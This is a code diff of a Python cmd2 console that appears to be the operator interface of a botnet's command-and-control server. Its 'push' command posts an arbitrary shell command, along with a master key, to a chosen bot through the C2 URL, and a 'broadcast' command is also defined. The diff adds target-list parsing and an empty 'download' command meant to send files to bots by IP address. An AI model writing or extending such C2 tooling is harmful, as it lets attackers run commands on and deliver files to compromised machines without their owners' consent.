@@ -1,5 +1,4 @@
 #!/usr/bin/env python
-"""A simple cmd2 application."""
 import argparse
 import requests
 import socket 
@@ -199,8 +198,6 @@ ___  ___          _              _____                       _
 
         self.poutput(output_botlist)
 
-
-
     """
     Command: Push 
     Description: Push a specific command to a specific bot. 
@@ -212,12 +209,14 @@ ___  ___          _              _____                       _
     @cmd2.with_category(CUSTOM_CATEGORY)
     @cmd2.with_argparser(push_parser)
     def do_push(self, args):
+        target_list = args.target.split(",")
+        print("[DEBUG] target_list = ", target_list)
+
         url = URL + '/bot/' + args.target + '/push'
         masterkey = MASTERKEY
         cmd = args.command 
 
         data = {'masterkey': masterkey, 'cmd': cmd}
-
         res = requests.post(url, data=data)
 
         output_push = ansi.style("[+] Command staged for: " + args.target, fg='green', bold=True)
@@ -234,6 +233,15 @@ ___  ___          _              _____                       _
 
     broadcast_parser = argparse.ArgumentParser()
     broadcast_parser.add_argument('-c', '--command', type=str, help='Command to push')
+
+    download_parser = argparse.ArgumentParser()
+    download_parser.add_argument('-t', '--target', type=str, help="Target bot's IP address to download the command")
+    download_parser.add_argument('-f', '--file', type=str, help="Target file to be downloaded to the bot")
+    
+    @cmd2.with_category(CUSTOM_CATEGORY)
+    @cmd2.with_argparser(download_parser)
+    def do_download(self, args):
+        pass 
 
     """
     Command: Broadcast 
